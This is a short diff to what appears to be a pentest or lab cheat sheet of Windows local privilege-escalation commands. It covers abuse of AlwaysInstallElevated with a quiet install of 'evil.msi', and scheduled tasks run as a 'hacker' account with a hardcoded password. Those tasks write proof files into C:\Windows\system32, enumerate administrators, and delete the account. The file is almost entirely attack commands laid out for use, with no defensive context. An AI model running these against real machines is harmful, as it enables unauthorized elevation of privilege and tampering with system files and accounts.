@@ -3,3 +3,15 @@ reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
 
 reg add "HKCU\Software\Policies\Microsoft\Windows\Installer"
 msiexec /quiet /qn /i evil.msi
+
+schtasks /create /tn testWrite /tr "cmd.exe /c echo Hacker was here > C:\Windows\system32\pwned.txt" /sc once /st 00:00 /ru hacker /rp Pass1234 /f
+schtasks /run /tn testWrite
+type C:\Windows\System32\pwned.txt
+
+echo TEST > C:\Windows\system32\pwned.txt
+
+net localgroup administrators
+
+net user hacker /del
+schtasks /create /tn deleteHacker /tr "cmd.exe /c net user hacker /del" /sc once /st 00:00 /ru hacker /rp Pass1234 /f
+schtasks /run /tn deleteHacker
